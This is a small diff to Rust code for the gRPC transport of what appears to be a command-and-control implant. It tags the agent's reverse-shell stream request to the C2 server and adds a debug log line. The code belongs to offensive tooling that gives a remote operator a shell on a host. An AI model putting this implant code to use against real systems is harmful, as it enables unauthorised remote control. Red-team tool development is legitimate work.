@@ -125,6 +125,7 @@ impl Transport for GRPC {
         let tonic_req = Request::new(out_stream);
         let resp = self.reverse_shell_impl(tonic_req).await?;
         let mut in_stream = resp.into_inner();
+
         tokio::spawn(async move {
             loop {
                 let msg = match in_stream.message().await {
@@ -317,7 +318,14 @@ impl GRPC {
         let codec: ProstCodec<ReverseShellRequest, ReverseShellResponse> =
             tonic::codec::ProstCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
-        let req = request.into_streaming_request();
-        self.grpc.streaming(req, path, codec).await
+        let mut req = request.into_streaming_request();
+        req.extensions_mut()
+            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
+        let resp = self.grpc.streaming(req, path, codec).await;
+
+        #[cfg(debug_assertions)]
+        log::info!("TRANSPORT: Stream Started!");
+
+        resp
     }
 }
